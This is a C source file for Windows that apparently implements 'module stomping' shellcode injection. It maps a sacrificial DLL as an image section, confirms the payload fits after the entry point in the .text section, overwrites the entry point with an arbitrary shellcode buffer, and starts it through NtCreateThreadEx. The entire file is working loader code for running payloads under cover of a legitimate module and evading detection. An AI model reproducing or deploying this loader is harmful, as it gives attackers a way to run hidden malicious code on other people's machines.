#include <Windows.h>

#include "Structs.h"
#include "injector.h"

#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)

#define PRNT_WN_ERR(szWnApiName)			printf("[!] %ws Failed With Error: %d \n", szWnApiName, GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)		printf("[!] %ws Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}	

NTAPIFP		g_NtApi = { 0x00 };

BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPnt) {

	HANDLE				hFile = INVALID_HANDLE_VALUE,
		hSection = NULL;
	NTSTATUS			STATUS = STATUS_SUCCESS;
	ULONG_PTR			uMappedModule = NULL;
	SIZE_T				sViewSize = NULL;
	PIMAGE_NT_HEADERS   pImgNtHdrs = NULL;

	if (!szDllFilePath || !phModule || !puEntryPnt)
		return FALSE;

	if ((hFile = CreateFileW(szDllFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		PRNT_WN_ERR(TEXT("CreateFileW"));
		goto _FUNC_CLEANUP;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
		PRNT_NT_ERR(TEXT("NtCreateSection"), STATUS);
		goto _FUNC_CLEANUP;
	}

	DELETE_HANDLE(hFile);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedModule, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
		PRNT_NT_ERR(TEXT("NtMapViewOfSection"), STATUS);
		goto _FUNC_CLEANUP;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _FUNC_CLEANUP;

	*phModule = (HMODULE)uMappedModule;
	*puEntryPnt = uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

_FUNC_CLEANUP:
	DELETE_HANDLE(hFile);
	DELETE_HANDLE(hSection);
	return (*phModule && *puEntryPnt) ? TRUE : FALSE;
}

BOOL VerifyInjection(IN ULONG_PTR uSacrificialModule, IN ULONG_PTR uEntryPoint, IN SIZE_T sPayloadSize) {


	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr = NULL;
	ULONG_PTR				uTextAddress = NULL;
	SIZE_T					sTextSize = NULL,
		sTextSizeLeft = NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uSacrificialModule + ((PIMAGE_DOS_HEADER)uSacrificialModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
			uTextAddress = uSacrificialModule + pImgSecHdr[i].VirtualAddress;
			sTextSize = pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}


	if (!uTextAddress || !sTextSize)
		return FALSE;

	/*
			 -----------	*uTextAddress*
			|			|
			|	  Y		|	>>>	Y = uEntryPoint - uTextAddress
			|			|
			 -----------	*uEntryPoint*
			|			|
			|			|
			|	  X		|	>>> X = sTextSize - Y
			|			|
			|			|
			 -----------	*uTextAddress + sTextSize*
	*/
	// Calculate the size between the entry point and the end of the text section.
	sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddress);

	printf("[i] Payload Size: %d Byte\n", sPayloadSize);
	printf("[i] Available Memory (Starting From The EP): %d Byte\n", sTextSizeLeft);

	// Check if the shellcode can fit 
	if (sTextSizeLeft >= sPayloadSize)
		return TRUE;

	return FALSE;
}


BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialDll, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {

	NTSTATUS	STATUS = STATUS_SUCCESS;
	HMODULE		hSacrificialModule = NULL;
	ULONG_PTR	uEntryPoint = NULL;
	HANDLE		hThread = NULL;
	DWORD		dwOldProtection = 0x00;

	if (!szSacrificialDll || !pBuffer || !sBufferSize)
		return FALSE;

	if (!LoadDllFile(szSacrificialDll, &hSacrificialModule, &uEntryPoint))
		return FALSE;

	printf("[*] %ws Loaded Successfully At: 0x%p \n", szSacrificialDll, (PVOID)hSacrificialModule);
	printf("[i] Entry Point: 0x%p \n", (PVOID)uEntryPoint);

	if (!VerifyInjection((ULONG_PTR)hSacrificialModule, uEntryPoint, sBufferSize))
		return FALSE;

	printf("[#] Press <Enter> To Continue ... ");
	getchar();


	if (!VirtualProtect(uEntryPoint, sBufferSize, PAGE_READWRITE, &dwOldProtection)) {
		PRNT_WN_ERR(TEXT("VirtualProtect"));
		return FALSE;
	}

	memcpy(uEntryPoint, pBuffer, sBufferSize);

	/* NOTE: YOUR PAYLOAD MAY REQUIRE RWX PERMISSIONS*/
	// dwOldProtection's VALUE IS RX	
	if (!VirtualProtect(uEntryPoint, sBufferSize, dwOldProtection, &dwOldProtection)) {
		PRNT_WN_ERR(TEXT("VirtualProtect"));
		return FALSE;
	}

	printf("[#] Press <Enter> To Execute NtCreateThreadEx ... ");
	getchar();

	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), uEntryPoint, NULL, FALSE, 0x00, 0x00, 0x00, NULL))) {
		PRNT_NT_ERR(TEXT("NtCreateThreadEx"), STATUS);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}